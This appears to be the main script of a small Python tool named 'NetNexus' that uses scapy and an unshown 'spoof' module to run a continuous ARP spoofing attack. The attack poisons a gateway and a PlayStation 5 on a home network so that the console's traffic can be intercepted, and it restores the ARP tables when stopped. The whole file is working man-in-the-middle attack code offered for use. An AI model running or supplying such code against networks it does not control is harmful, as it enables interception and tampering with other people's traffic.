import scapy.all as scapy
import os
import time
from core import spoof

def main():
    # --- CONFIGURATION ---
    # !!! Replace 'wlan0' with your actual interface from 'ip a' !!!
    scapy.conf.iface = "wlan0" 
    
    if os.geteuid() != 0:
        print("[-] NetNexus requires root. Run with: sudo python main.py")
        return

    gateway_ip = "192.168.8.1"
    target_ip = "192.168.8.5" # Your PS5

    print(f"=== NetNexus: PS5 Targeted Mode ===")
    print(f"[*] Monitoring Interface: {scapy.conf.iface}")
    
    # Resolve hardware addresses
    target_mac, _ = spoof.get_device_info(target_ip)
    gateway_mac, _ = spoof.get_device_info(gateway_ip)

    if not target_mac or not gateway_mac:
        print("[-] Error: Could not resolve MACs. Ensure PS5 is awake.")
        return

    print(f"[*] Target MAC: {target_mac}")
    print(f"[*] Gateway MAC: {gateway_mac}")

    try:
        print("\n[!] Attack Active: Intercepting PS5 Traffic...")
        print("[*] Press Ctrl+C to stop and heal the network.")
        while True:
            # Aggressive 0.5s timing for console stability
            spoof.spoof(target_ip, gateway_ip, target_mac, gateway_mac)
            time.sleep(0.5) 
    except KeyboardInterrupt:
        print("\n[*] Stopping... Restoring original ARP tables.")
        spoof.restore(target_ip, gateway_ip)
        spoof.restore(gateway_ip, target_ip)
        print("[+] Network restored.")

if __name__ == "__main__":
    main()
